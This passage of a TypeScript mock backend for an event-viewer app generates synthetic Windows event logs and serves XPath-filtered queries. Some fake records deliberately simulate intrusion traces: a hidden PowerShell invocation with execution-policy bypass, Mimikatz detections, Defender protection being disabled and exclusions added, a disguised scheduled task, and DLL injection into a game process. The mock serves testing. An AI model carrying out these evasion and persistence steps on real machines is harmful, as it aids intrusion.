      ...ps,
      eventId: 4103,
      version: 1,
      level: 4,
      task: 106,
      taskName: "Executing Pipeline",
      opcode: 20,
      opcodeName: "To be used when operation is just executing a method",
      keywords: "0x0",
      data: [["ContextInfo", `        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.26100.2161\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.26100.2161\n        Command Name = ${cmd}\n        Command Type = Cmdlet\n        User = ${ME}`], ["UserData", ""], ["Payload", `CommandInvocation(${cmd}): "${cmd}"`]],
      message: `CommandInvocation(${cmd}): "${cmd}"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Command Name = ${cmd}\n        Command Type = Cmdlet\n        User = ${ME}`,
    };
  }
  return {
    ...ps,
    eventId: id,
    version: 1,
    level: 4,
    task: id === 53504 ? 111 : 4,
    taskName: id === 53504 ? "PowerShell Named Pipe IPC" : "PowerShell Console Startup",
    opcode: id === 40961 ? 1 : id === 40962 ? 2 : 1,
    opcodeName: id === 40962 ? "Stop" : "Start",
    keywords: "0x0",
    data: id === 53504 ? [["param1", String(ps.pid)], ["param2", "DefaultAppDomain"]] : [],
    message: id === 40961 ? "PowerShell console is starting up" : id === 40962 ? "PowerShell console is ready for user input" : `Windows PowerShell has started an IPC listening thread on process: ${ps.pid} in AppDomain: DefaultAppDomain.`,
  };
};

const legacyPowershellMaker: Maker = (r) => {
  const id = weighted(r, [400, 403, 600, 800], [3, 3, 6, 2]);
  const prov = pick(r, ["Registry", "Alias", "Environment", "FileSystem", "Function", "Variable"]);
  const host = "HostName=ConsoleHost\n\tHostVersion=5.1.26100.2161\n\tHostApplication=powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden\n\tEngineVersion=5.1.26100.2161";
  return {
    provider: "PowerShell",
    classic: true,
    qualifiers: 0,
    eventId: id,
    level: 4,
    task: id === 600 ? 6 : id === 800 ? 8 : 4,
    taskName: id === 600 ? "Provider Lifecycle" : id === 800 ? "Pipeline Execution Details" : "Engine Lifecycle",
    keywords: "0x80000000000000",
    keywordNames: ["Classic"],
    data: [["Data 1", id === 600 ? prov : "Available"], ["Data 2", id === 600 ? "Started" : "None"], ["Data 3", `\tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\t${host}`]],
    message:
      id === 600
        ? `Provider "${prov}" is Started. \n\nDetails: \n\tProviderName=${prov}\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\t${host}`
        : id === 800
          ? `Pipeline execution details for command line: Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\t${host}`
          : `Engine state is changed from ${id === 400 ? "None to Available" : "Available to Stopped"}. \n\nDetails: \n\tNewEngineState=${id === 400 ? "Available" : "Stopped"}\n\tPreviousEngineState=${id === 400 ? "None" : "Available"}\n\n\tSequenceNumber=13\n\n\t${host}`,
  };
};

const defenderMaker: Maker = (r) => {
  const id = weighted(r, [1150, 2000, 1000, 1001, 5007, 1116, 1117, 5001, 2010], [6, 4, 2, 2, 2, 0.6, 0.6, 0.2, 2]);
  const d = { provider: "Microsoft-Windows-Windows Defender", guid: "{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}", pid: 4388, sid: "S-1-5-18", keywords: "0x8000000000000000" };
  const threat = pick(r, [
    ["HackTool:Win64/Mimikatz!pz", "C:\\Users\\alex\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe", "High", "Tool"],
    ["Trojan:Win32/Wacatac.B!ml", "C:\\Users\\alex\\AppData\\Local\\Temp\\upd4721.dll", "Severe", "Trojan"],
    ["HackTool:Win64/WinRing0", "C:\\Users\\alex\\AppData\\Local\\Temp\\WinRing0x64.sys", "High", "Tool"],
  ]);
  switch (id) {
    case 1116:
    case 1117:
      return {
        ...d,
        eventId: id,
        level: id === 1116 ? 3 : 4,
        task: 0,
        taskName: "None",
        data: [["Product Name", "Microsoft Defender Antivirus"], ["Threat Name", threat[0]], ["Severity Name", threat[2]], ["Category Name", threat[3]], ["Path", `file:_${threat[1]}`], ["Detection User", ME], ["Process Name", "C:\\Windows\\explorer.exe"], ["Action Name", id === 1117 ? "Quarantine" : "Not Applicable"]],
        message: `Microsoft Defender Antivirus has ${id === 1116 ? "detected malware or other potentially unwanted software" : "taken action to protect this machine from malware or other potentially unwanted software"}.\n For more information please see the following:\nhttps://go.microsoft.com/fwlink/?linkid=37020&name=${threat[0]}\n \tName: ${threat[0]}\n \tSeverity: ${threat[2]}\n \tCategory: ${threat[3]}\n \tPath: file:_${threat[1]}\n \tDetection Origin: Local machine\n \tDetection Type: Concrete\n \tDetection Source: Real-Time Protection\n \tUser: ${ME}\n \tProcess Name: C:\\Windows\\explorer.exe${id === 1117 ? "\n \tAction: Quarantine" : ""}`,
      };
    case 5001:
      return { ...d, eventId: 5001, level: 3, data: [["Product Name", "Microsoft Defender Antivirus"]], message: "Microsoft Defender Antivirus Real-time Protection scanning for malware and other potentially unwanted software was disabled." };
    case 5007:
      return { ...d, eventId: 5007, level: 4, data: [["Old Value", ""], ["New Value", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0"]], message: "Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review the settings as this may be the result of malware.\n \tOld value: \n \tNew value: HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools = 0x0" };
    case 2000:
    case 2010:
      return { ...d, eventId: id, level: 4, data: [["Current security intelligence Version", "1.421.161.0"], ["Previous security intelligence Version", "1.421.144.0"]], message: id === 2000 ? "Microsoft Defender Antivirus security intelligence version updated.\n \tCurrent security intelligence Version: 1.421.161.0\n \tPrevious security intelligence Version: 1.421.144.0\n \tSecurity intelligence Type: AntiVirus\n \tUpdate Type: Delta" : "Microsoft Defender Antivirus used Dynamic Signature Service to retrieve additional security intelligence to help protect your machine." };
    case 1000:
    case 1001:
      return { ...d, eventId: id, level: 4, data: [["Scan Type", "Antimalware"], ["Scan Parameters", "Quick Scan"]], message: `Microsoft Defender Antivirus scan has ${id === 1000 ? "started" : "finished"}.\n \tScan ID: ${guid(r).toUpperCase()}\n \tScan Type: Antimalware\n \tScan Parameters: Quick Scan` };
    default:
      return { ...d, eventId: 1150, level: 4, data: [["Platform version", "4.18.24090.11"], ["Engine version", "1.1.24090.11"]], message: "Endpoint Protection client is up and running in a healthy state. \n \tPlatform version: 4.18.24090.11\n \tEngine version: 1.1.24090.11\n \tSecurity intelligence version: 1.421.161.0" };
  }
};

const TASKS = ["\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan", "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag", "\\GoogleUpdateTaskMachineUA{4A1C1E52-1D88-4D9C-9C1E-8F7E1E7D0B1A}", "\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser", "\\OneDrive Updater", "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start"];
const taskMaker: Maker = (r) => {
  const id = weighted(r, [100, 102, 200, 201, 129, 110, 106, 140, 141, 101], [8, 8, 8, 8, 4, 2, 0.4, 0.6, 0.2, 0.6]);
  const task = r() < 0.06 ? "\\OneDrive Updater" : pick(r, TASKS);
  const inst = guid(r);
  const msgs: Record<number, [string, string, number]> = {
    100: [`Task Scheduler started "${inst}" instance of the "${task}" task for user "${SYSTEM}".`, "Task Started", 1],
    102: [`Task Scheduler successfully finished "${inst}" instance of the "${task}" task for user "${SYSTEM}".`, "Task completed", 2],
    200: [`Task Scheduler launched action "C:\\Windows\\system32\\usoclient.exe" in instance "${inst}" of task "${task}".`, "Action started", 1],
    201: [`Task Scheduler successfully completed task "${task}" , instance "${inst}" , action "C:\\Windows\\system32\\usoclient.exe" with return code 0.`, "Action completed", 2],
    129: [`Task Scheduler launch task "${task}" , instance "C:\\Windows\\system32\\usoclient.exe"  with process ID ${int(r, 1000, 30000)}.`, "Created Task Process", 0],
    110: [`Task Scheduler launched "${inst}"  instance of task "${task}"  for user "${USER}" .`, "Task triggered by user", 0],
    106: [`User "${ME}"  registered Task Scheduler task "\\OneDrive Updater"`, "Task registered", 0],
    140: [`User "${ME}"  updated Task Scheduler task "\\OneDrive Updater"`, "Task registration updated", 0],
    141: [`User "${ME}"  deleted Task Scheduler task "\\OneDrive Updater"`, "Task registration deleted", 0],
    101: [`Task Scheduler failed to start "${task}" task for user "${SYSTEM}". Additional Data: Error Value: 2147750687.`, "Task Start Failed", 0],
  };
  const [message, taskName, opcode] = msgs[id];
  return {
    provider: "Microsoft-Windows-TaskScheduler",
    guid: "{de7b24ea-73c8-4a09-985d-5bdadcfa9017}",
    eventId: id,
    version: 0,
    level: id === 101 ? 2 : 4,
    task: id,
    taskName,
    opcode,
    opcodeName: opcode === 1 ? "Start" : opcode === 2 ? "Stop" : "Info",
    keywords: "0x8000000000000000",
    pid: 1844,
    sid: "S-1-5-18",
    activity: inst,
    data: [["TaskName", id === 106 || id === 140 || id === 141 ? "\\OneDrive Updater" : task], ["UserContext", id >= 106 && id <= 141 ? ME : SYSTEM], ["InstanceId", inst]],
    message,
  };
};

const rdpMaker: Maker = (r) => {
  const id = weighted(r, [21, 22, 24, 25, 23, 40], [3, 3, 2, 2, 1, 2]);
  const session = int(r, 1, 4);
  const addr = r() < 0.7 ? "LOCAL" : pick(r, ["192.168.1.66", "10.8.0.14"]);
  const names: Record<number, string> = { 21: "Session logon succeeded", 22: "Shell start notification received", 23: "Session logoff succeeded", 24: "Session has been disconnected", 25: "Session reconnection succeeded" };
  return {
    provider: "Microsoft-Windows-TerminalServices-LocalSessionManager",
    guid: "{5d896912-022d-40aa-a3a8-4fa5515c76d7}",
    eventId: id,
    level: 4,
    task: 0,
    keywords: "0x1000000000000000",
    pid: 1240,
    sid: "S-1-5-18",
    userData: id === 40 ? `<EventXML xmlns='Event_NS'><Session>${session}</Session><Reason>0</Reason></EventXML>` : `<EventXML xmlns='Event_NS'><User>${ME}</User><SessionID>${session}</SessionID><Address>${addr}</Address></EventXML>`,
    message: id === 40 ? `Session ${session} has been disconnected, reason code 0` : `Remote Desktop Services: ${names[id]}:\n\nUser: ${ME}\nSession ID: ${session}\nSource Network Address: ${addr}`,
  };
};

const ciMaker: Maker = (r) => {
  const id = weighted(r, [3033, 3089, 3077, 3004], [3, 3, 1, 1]);
  const dll = pick(r, ["\\Device\\HarddiskVolume3\\Users\\alex\\AppData\\Local\\Temp\\hook64.dll", "\\Device\\HarddiskVolume3\\Program Files\\Razer\\RzOverlay\\overlay64.dll", "\\Device\\HarddiskVolume3\\Users\\alex\\Tools\\inject.dll"]);
  const proc = "\\Device\\HarddiskVolume3\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe";
  return {
    provider: "Microsoft-Windows-CodeIntegrity",
    guid: "{4ee76bd8-3cf4-44a0-a0ac-3937643e37a3}",
    eventId: id,
    version: id === 3089 ? 2 : 4,
    level: id === 3089 ? 4 : id === 3004 ? 2 : 2,
    task: id === 3089 ? 1 : 3,
    taskName: "",
    keywords: "0x8000000000000000",
    pid: 17744,
    sid: USER_SID,
    data: [["FileNameLength", String(dll.length)], ["FileNameBuffer", dll], ["ProcessNameLength", String(proc.length)], ["ProcessNameBuffer", proc], ["RequestedPolicy", "8"], ["ValidatedPolicy", "1"], ["Status", "0xc0000428"]],
    message:
      id === 3089
        ? "Signature information for another event. Match UMCI Event ID 3033 in log."
        : id === 3004
          ? `Windows is unable to verify the image integrity of the file ${dll} because file hash could not be found on the system. A recent hardware or software change might have installed a file that is signed incorrectly or damaged, or that might be malicious software from an unknown source.`
          : `Code Integrity determined that a process (${proc}) attempted to load ${dll} that did not meet the ${id === 3077 ? "Enterprise" : "Microsoft"} signing level requirements.`,
  };
};

/** Anything else: a few plausible events from the log's own provider. */
function genericMaker(channel: string): Maker {
  const provider = channel.includes("/") ? channel.slice(0, channel.indexOf("/")) : channel;
  const short = provider.replace(/^Microsoft-Windows-/, "");
  const g = guid(rng(hash(provider)));
  const templates: [number, number, string][] = [
    [100, 4, `${short}: the component started successfully.`],
    [101, 4, `${short}: configuration loaded from the registry (${int(rng(hash(channel)), 3, 40)} settings).`],
    [200, 4, `${short}: operation completed.`],
    [201, 4, `${short}: the request was processed in %MS% ms.`],
    [300, 3, `${short}: the operation is taking longer than expected; retrying.`],
    [400, 2, `${short}: the operation failed with error 0x80070005 (Access is denied).`],
  ];
  return (r) => {
    const [id, level, msg] = weighted(r, templates, [5, 3, 6, 6, 1.2, 0.6]);
    const ms = String(int(r, 2, 900));
    return {
      provider,
      guid: g,
      eventId: id,
      version: 0,
      level,
      task: 0,
      keywords: "0x8000000000000000",
      pid: int(r, 400, 9000) & ~3,
      sid: r() < 0.5 ? "S-1-5-18" : USER_SID,
      data: [["Component", short], ["Operation", id >= 400 ? "Write" : "Read"], ["Duration", ms], ["Status", id >= 400 ? "0x80070005" : "0x0"]],
      message: msg.replace("%MS%", ms),
    };
  };
}

// ── logs ─────────────────────────────────────────────────────────────────

interface Model {
  ch: EventChannel;
  first: number;
  base: number;
  gap: number;
  maker: Maker;
  admin?: boolean;
  /** events added since the page loaded (live) */
  live: number[];
}

const T0 = Date.now() - 15_000;
const models = new Map<string, Model>();

function add(name: string, kind: EventChannel["kind"], opts: { enabled?: boolean; count?: number; gap?: number; first?: number; maker?: Maker; admin?: boolean } = {}) {
  const enabled = opts.enabled ?? true;
  const h = hash(name);
  const count = enabled ? (opts.count ?? 40 + (h % 500)) : (opts.count ?? 0);
  models.set(name, {
    ch: { name, enabled, kind },
    first: opts.first ?? 1 + (h % 5000),
    base: count,
    gap: opts.gap ?? 1800 + (h % 7200),
    maker: opts.maker ?? genericMaker(name),
    admin: opts.admin,
    live: [],
  });
}

add("Application", "classic", { count: 4200, gap: 90, first: 61208, maker: applicationMaker });
add("System", "classic", { count: 9800, gap: 45, first: 284431, maker: systemMaker });
add("Security", "classic", { count: 48000, gap: 3, first: 1203112, maker: securityMaker, admin: true });
add("Setup", "operational", { count: 180, gap: 40000 });
add("ForwardedEvents", "operational", { count: 0 });
add("HardwareEvents", "classic", { count: 0 });
add("Internet Explorer", "classic", { count: 0 });
add("Key Management Service", "classic", { count: 0 });
add("Windows PowerShell", "classic", { count: 1400, gap: 380, first: 9811, maker: legacyPowershellMaker });
add("OAlerts", "classic", { count: 36, gap: 50000 });
add("Microsoft-Windows-Sysmon/Operational", "operational", { count: 36000, gap: 1.6, first: 5523001, maker: sysmonMaker });
add("Microsoft-Windows-PowerShell/Operational", "operational", { count: 6200, gap: 55, first: 40112, maker: powershellMaker });
add("Microsoft-Windows-PowerShell/Admin", "admin", { count: 12 });
add("PowerShellCore/Operational", "operational", { count: 900, maker: powershellMaker });
add("Microsoft-Windows-Windows Defender/Operational", "operational", { count: 950, gap: 600, maker: defenderMaker });
add("Microsoft-Windows-Windows Defender/WHC", "operational", { count: 30 });
add("Microsoft-Windows-TaskScheduler/Operational", "operational", { count: 5200, gap: 30, maker: taskMaker });
add("Microsoft-Windows-TaskScheduler/Maintenance", "operational", { count: 60 });
add("Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", "operational", { count: 320, gap: 3600, maker: rdpMaker });
add("Microsoft-Windows-TerminalServices-LocalSessionManager/Admin", "admin", { count: 40, maker: rdpMaker });
add("Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational", "operational");
add("Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin", "admin");
add("Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational", "operational");
add("Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Admin", "admin");
add("Microsoft-Windows-CodeIntegrity/Operational", "operational", { count: 420, gap: 2400, maker: ciMaker });
add("Microsoft-Windows-CodeIntegrity/Verbose", "analytic", { enabled: false });
add("Microsoft-Windows-Kernel-Power/Thermal-Operational", "operational");
add("Microsoft-Windows-Kernel-PnP/Configuration", "operational");
add("Microsoft-Windows-Kernel-Boot/Operational", "operational");
add("Microsoft-Windows-Kernel-EventTracing/Admin", "admin");
add("Microsoft-Windows-Kernel-EventTracing/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-Kernel-Process/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-Kernel-File/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-Kernel-Network/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-Kernel-Registry/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-Bits-Client/Operational", "operational");
add("Microsoft-Windows-Bits-Client/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-WMI-Activity/Operational", "operational");
add("Microsoft-Windows-WMI-Activity/Trace", "analytic", { enabled: false });
add("Microsoft-Windows-WMI-Activity/Debug", "debug", { enabled: false });
add("Microsoft-Windows-Windows Firewall With Advanced Security/Firewall", "operational");
add("Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity", "operational");
add("Microsoft-Windows-Windows Firewall With Advanced Security/FirewallDiagnostics", "operational", { enabled: false });
add("Microsoft-Windows-WinRM/Operational", "operational");
add("Microsoft-Windows-WinRM/Analytic", "analytic", { enabled: false });
add("Microsoft-Windows-WinRM/Debug", "debug", { enabled: false });
add("Microsoft-Windows-Security-Mitigations/KernelMode", "operational");
add("Microsoft-Windows-Security-Mitigations/UserMode", "operational");
add("Microsoft-Windows-AppLocker/EXE and DLL", "admin");
add("Microsoft-Windows-AppLocker/MSI and Script", "admin");
add("Microsoft-Windows-AppLocker/Packaged app-Deployment", "admin");
add("Microsoft-Windows-AppLocker/Packaged app-Execution", "admin");
add("Microsoft-Windows-DNS-Client/Operational", "operational", { enabled: false });
add("Microsoft-Windows-DriverFrameworks-UserMode/Operational", "operational", { enabled: false });
add("Microsoft-Windows-GroupPolicy/Operational", "operational");
add("Microsoft-Windows-NetworkProfile/Operational", "operational");
add("Microsoft-Windows-NTLM/Operational", "operational");
add("Microsoft-Windows-SMBClient/Security", "operational");
add("Microsoft-Windows-SMBClient/Connectivity", "operational");
add("Microsoft-Windows-SMBClient/Operational", "operational");
add("Microsoft-Windows-SMBServer/Operational", "operational");
add("Microsoft-Windows-SMBServer/Security", "operational");
add("Microsoft-Windows-SMBServer/Audit", "operational");
add("Microsoft-Windows-Diagnostics-Performance/Operational", "operational");
add("Microsoft-Windows-Application-Experience/Program-Telemetry", "operational");
add("Microsoft-Windows-AppXDeploymentServer/Operational", "operational");
add("Microsoft-Windows-Store/Operational", "operational");
add("Microsoft-Windows-WindowsUpdateClient/Operational", "operational");
add("Microsoft-Windows-User Profile Service/Operational", "operational");
add("Microsoft-Windows-Winlogon/Operational", "operational");
add("Microsoft-Windows-WLAN-AutoConfig/Operational", "operational");
add("Microsoft-Windows-Time-Service/Operational", "operational");
add("Microsoft-Windows-Shell-Core/Operational", "operational");
add("Microsoft-Windows-Crypto-DPAPI/Operational", "operational");
add("Microsoft-Windows-Crypto-DPAPI/BackUpKeySvc", "operational");
add("Microsoft-Windows-Crypto-DPAPI/Debug", "debug", { enabled: false });
add("Microsoft-Windows-LSA/Operational", "operational");
add("Microsoft-Windows-Hyper-V-Hypervisor-Operational", "operational");
add("Microsoft-Windows-Hyper-V-Worker-Admin", "admin");
add("Microsoft-Windows-Dhcp-Client/Admin", "admin");
add("Microsoft-Windows-Dhcpv6-Client/Admin", "admin");
add("Microsoft-Windows-Ntfs/Operational", "operational");
add("Microsoft-Windows-Storage-Storport/Operational", "operational");
add("Microsoft-Windows-Storage-Storport/Health", "operational");
add("Microsoft-Windows-PrintService/Admin", "admin");
add("Microsoft-Windows-PrintService/Operational", "operational", { enabled: false });
add("Microsoft-Windows-VHDMP-Operational", "operational");
add("Microsoft-Client-Licensing-Platform/Admin", "admin");
add("OpenSSH/Admin", "admin");
add("OpenSSH/Operational", "operational", { count: 140 });
add("Windows Networking Vpn Plugin Platform/Operational", "operational");
add("Visual Studio/Diagnostics", "operational", { count: 22 });

// ── generation and queries ───────────────────────────────────────────────

interface Meta {
  id: number;
  level: number;
  eventId: number;
  provider: string;
  time: number;
  keywords: string;
}

function last(m: Model) {
  return m.first + m.base - 1 + m.live.length;
}

function generate(m: Model, id: number): { meta: Meta; xml: () => string } {
  const r = rng(hash(m.ch.name) ^ Math.imul(id, 2654435761));
  const lastBase = m.first + m.base - 1;
  const jitter = r() * 0.9 * m.gap * 1000;
  const t = id > lastBase ? m.live[id - lastBase - 1] : Math.round(T0 - (lastBase - id) * m.gap * 1000 - jitter);
  const s = m.maker(r, t);
  return {
    meta: { id, level: s.level, eventId: s.eventId, provider: s.provider, time: t, keywords: s.keywords ?? "0x80000000000000" },
    xml: () => toXml(m.ch.name, id, t, s, r),
  };
}

const invalid = (why: string) => new Error(`The filter isn't a valid event query: ${why}`);
const ALLOWED = new Set(["m", "eventId", "level", "provider", "time", "keywords", "now", "band"]);

/** Translate the XPath subset the module generates into a predicate. */
function compile(xpath?: string): (m: Meta) => boolean {
  const s = (xpath ?? "").trim();
  if (!s || s === "*") return () => true;
  let b = 0;
  let p = 0;
  for (const c of s) {
    if (c === "[") b++;
    else if (c === "]") b--;
    else if (c === "(") p++;
    else if (c === ")") p--;
    if (b < 0 || p < 0) throw invalid("unbalanced brackets");
  }
  if (b || p) throw invalid("unbalanced brackets");
  if (!/^\*\s*\[/.test(s) && !/^<QueryList/i.test(s)) throw invalid(`the query must start with *[ (got "${s.slice(0, 20)}")`);
  const m = /^\*\s*\[\s*System\s*\[([\s\S]*)\]\s*\]$/.exec(s);
  if (!m) {
    console.warn("[mock] XPath beyond the mock's subset; matching every event:", s);
    return () => true;
  }
  const js = m[1]
    .replace(/Provider\[([^\]]*)\]/g, (_, inner: string) => "(" + inner.replace(/@Name\s*=\s*("[^"]*"|'[^']*')/g, (_x, q: string) => `m.provider===${JSON.stringify(q.slice(1, -1))}`).replace(/\bor\b/g, "||") + ")")
    .replace(/TimeCreated\[\s*timediff\(\s*@SystemTime\s*\)\s*<=\s*(\d+)\s*\]/g, "(now-m.time<=$1)")
    .replace(/band\(\s*Keywords\s*,\s*(\d+)\s*\)/g, "band(m.keywords,$1)")
    .replace(/\bEventID\b/g, "m.eventId")
    .replace(/\bLevel\b/g, "m.level")
    .replace(/\bnot\s*\(/g, "!(")
    .replace(/\band\b/g, "&&")
    .replace(/\bor\b/g, "||")
    .replace(/([^!<>=])=(?!=)/g, "$1===");
  const idents = js.replace(/"(?:[^"\\]|\\.)*"/g, "").match(/[A-Za-z_]\w*/g) ?? [];
  const unknown = idents.find((i) => !ALLOWED.has(i));
  if (unknown) {
    if (/^[A-Z]/.test(unknown) && /^(Task|Opcode|Keywords|Computer|Security|Execution|EventRecordID|Channel)$/.test(unknown)) {
      console.warn("[mock] XPath field beyond the mock's subset; matching every event:", unknown);
      return () => true;
    }
    throw invalid(`unknown name "${unknown}"`);
  }
  if (/[^\w\s.()!&|<>=+\-"',:/\\@ {}#]/.test(js)) throw invalid("unexpected character");
  try {
    const fn = new Function("m", "now", "band", `return (${js});`) as (m: Meta, now: number, band: (a: string, b: number) => boolean) => boolean;
    const band = (a: string, bits: number) => (BigInt(a) & BigInt(bits)) !== 0n;
    fn({ id: 0, level: 0, eventId: 0, provider: "", time: 0, keywords: "0x0" }, 0, band);
    return (meta) => !!fn(meta, Date.now(), band);
  } catch (e) {
    throw invalid(e instanceof Error ? e.message : String(e));
  }
}

interface Cursor {
  m: Model;
  pos: number;
  lo: number;
  hi: number;
  step: 1 | -1;
  pred: (m: Meta) => boolean;
  text: string;
}
const cursors = new Map<number, Cursor>();
let nextCursor = 1;

function readPage(id: number, c: Cursor, max: number): EventPage {
  const out: string[] = [];
  let scanned = 0;
  const cap = c.text ? 2500 : Infinity;
  while (out.length < max && scanned < cap && c.pos >= c.lo && c.pos <= c.hi) {
    const g = generate(c.m, c.pos);
    c.pos += c.step;
    scanned++;
    if (!c.pred(g.meta)) continue;
    const x = g.xml();
    if (c.text && !x.toLowerCase().includes(c.text)) continue;
    out.push(x);
  }
  const done = c.pos < c.lo || c.pos > c.hi;
  if (done) cursors.delete(id);
  return { cursor: done ? null : id, events: out, done, scanned };
}

const later = <T>(v: T, ms: number) => new Promise<T>((res) => setTimeout(() => res(v), ms));
const admin = () => new URLSearchParams(location.search).has("admin");

function model(channel: string): Model {
  const m = models.get(channel);
  if (!m) throw new Error(`No such log: ${channel}`);
  if (m.admin && !admin()) throw new Error("Access is denied. (os error 5)");
  return m;
}

interface Sub {
  m: Model;
  pred: (m: Meta) => boolean;
  text: string;
  seen: number;
}
const subs = new Map<number, Sub>();
let nextSub = 1;

// new events every couple of seconds
setInterval(() => {
  const r = Math.random;
  const grow = (name: string, n: number) => {
    const m = models.get(name)!;
    for (let i = 0; i < n; i++) m.live.push(Date.now() - Math.floor(r() * 400));
  };
  grow("Microsoft-Windows-Sysmon/Operational", 1 + Math.floor(r() * 3));
  grow("Security", Math.floor(r() * 3));
  if (r() < 0.25) grow("Application", 1);
  if (r() < 0.2) grow("System", 1);
  if (r() < 0.15) grow("Microsoft-Windows-PowerShell/Operational", 2);
  if (r() < 0.1) grow("Microsoft-Windows-TaskScheduler/Operational", 2);
}, 2200);

export function install() {
  installMock(
    {
      eventlog: {
        channels: () => later([...models.values()].map((m) => m.ch), 150),
        info: async (channel: string): Promise<EventLogInfo> => {
          const m = model(channel);
          const count = m.base + m.live.length;
          return later({ records: count, fileSize: count ? Math.ceil((count * 1180) / 65536) * 65536 : 69632, lastWrite: count ? generate(m, last(m)).meta.time : null, oldestRecord: count ? m.first : null }, 60);
        },
        query: async (q: EventQuery): Promise<EventPage> => {
          await later(null, 120);
          const m = model(q.channel);
          const pred = compile(q.xpath);
          const reverse = q.reverse ?? true;
          const id = nextCursor++;
          const c: Cursor = { m, lo: m.first, hi: last(m), pos: reverse ? last(m) : m.first, step: reverse ? -1 : 1, pred, text: (q.text ?? "").toLowerCase() };
          cursors.set(id, c);
          const page = readPage(id, c, Math.max(1, Math.min(1000, q.max ?? 200)));
          return later(page, c.text ? 150 + page.scanned / 20 : 40);
        },
        more: async (cursor: number, max?: number): Promise<EventPage> => {
          const c = cursors.get(cursor);
          if (!c) throw new Error(`No such cursor: ${cursor}`);
          const page = readPage(cursor, c, Math.max(1, Math.min(1000, max ?? 200)));
          return later(page, c.text ? 150 + page.scanned / 20 : 60);
        },
        close: async (cursor: number) => later(cursors.delete(cursor), 0),
        subscribe: async (q: Omit<EventQuery, "reverse" | "max">) => {
          const m = model(q.channel);
          const id = nextSub++;
          subs.set(id, { m, pred: compile(q.xpath), text: (q.text ?? "").toLowerCase(), seen: last(m) });
          return later(id, 50);
        },
        poll: async (subscription: number, max?: number) => {
          const s = subs.get(subscription);
          if (!s) throw new Error(`No such subscription: ${subscription}`);
          const out: string[] = [];
          const end = last(s.m);
          while (s.seen < end && out.length < (max ?? 500)) {
            s.seen++;
            const g = generate(s.m, s.seen);
            if (!s.pred(g.meta)) continue;
            const x = g.xml();
            if (s.text && !x.toLowerCase().includes(s.text)) continue;
            out.push(x);
          }
          return later(out, 20);
        },
        unsubscribe: async (subscription: number) => later(subs.delete(subscription), 0),
      },
    },
    "event-viewer",
  );
}
